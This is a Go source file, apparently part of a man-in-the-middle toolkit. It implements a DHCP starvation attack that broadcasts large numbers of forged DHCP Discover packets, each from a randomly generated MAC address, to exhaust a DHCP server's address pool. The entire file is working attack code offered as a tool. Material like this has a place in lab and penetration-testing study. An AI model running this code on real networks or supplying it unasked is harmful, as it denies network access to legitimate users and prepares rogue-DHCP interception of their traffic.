package dhcp

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"mitm-toolkit/network"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// basically need to send DHCP Discover with random MAC address

func StartStarvation(iface network.NetworkInterface, count int) error {

	// open the interface
	handle, err := pcap.OpenLive(
		iface.InterfaceName,
		65535,
		true,
		1*time.Second,
	)

	if err != nil {
		return fmt.Errorf("Failed to open interface: %v", err)
	}

	defer handle.Close()

	for i := 0; i < count; i++ {

		randomMAC, err := generateRandomMAC()
		if err != nil {
			return err
		}

		// layer 2
		eth := layers.Ethernet{
			SrcMAC:       randomMAC, // need to be random MAC address
			DstMAC:       []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
			EthernetType: layers.EthernetTypeIPv4,
		}

		// layer 3
		ipv4 := layers.IPv4{
			SrcIP:    net.ParseIP("0.0.0.0"),         // client has no ip yet
			DstIP:    net.ParseIP("255.255.255.255"), // brodcast to everyone search for a DHCP server
			Version:  4,
			TTL:      64, // standart for linux
			Protocol: layers.IPProtocolUDP,
		}

		// layer 4
		udp := layers.UDP{
			SrcPort: 68, //client
			DstPort: 67, //server
		}

		udp.SetNetworkLayerForChecksum(&ipv4)

		// generate random Xid
		xid := make([]byte, 4)
		rand.Read(xid)

		// layer 7 - DHCP
		dhcpV4 := layers.DHCPv4{
			Operation:    layers.DHCPOpRequest,
			HardwareType: layers.LinkTypeEthernet,
			HardwareLen:  6,
			Xid:          binary.BigEndian.Uint32(xid),
			ClientHWAddr: randomMAC,
			Options: layers.DHCPOptions{
				layers.DHCPOption{
					Type:   layers.DHCPOptMessageType,
					Data:   []byte{byte(layers.DHCPMsgTypeDiscover)},
					Length: 1,
				},
			},
		}

		// Serialize the Packet (Convert to raw bytes)
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		// send
		err = gopacket.SerializeLayers(buf, opts, &eth, &ipv4, &udp, &dhcpV4)
		if err != nil {
			return fmt.Errorf("failed to serialize packet: %v", err)
		}

		err = handle.WritePacketData(buf.Bytes())
		if err != nil {
			return fmt.Errorf("failed to send DHCP response: %v", err)
		}

		fmt.Printf("[%d/%d] Sent DHCP Discover from %s\n", i+1, count, randomMAC)
		
		// small delay (not overwhelm the interface)
		time.Sleep(100 * time.Millisecond)

	}

	return nil
}

func generateRandomMAC() (net.HardwareAddr, error) {

	macAddr := make([]byte, 6)   // creating slice with length of 6
	_, err := rand.Read(macAddr) // random values

	if err != nil {
		return nil, fmt.Errorf("failed to generate random MAC: %v", err)
	}
	macAddr[0] = 0x02 // 0 marks it as locally administered.

	return net.HardwareAddr(macAddr), nil

}
